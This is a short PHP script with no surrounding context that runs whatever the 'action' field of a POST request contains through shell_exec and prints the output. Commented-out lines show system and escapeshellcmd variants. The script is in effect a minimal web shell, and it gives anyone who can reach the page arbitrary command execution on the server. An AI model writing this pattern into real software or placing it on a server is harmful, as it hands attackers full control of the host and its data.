

<?php 
   if ($_POST['action'])
    {
	//$command = escapeshellcmd('/usr/custom/test.py');
	//$output = system($_POST['action'],$retval);
        $output = shell_exec($_POST['action']);
        echo $output;
    }
?>



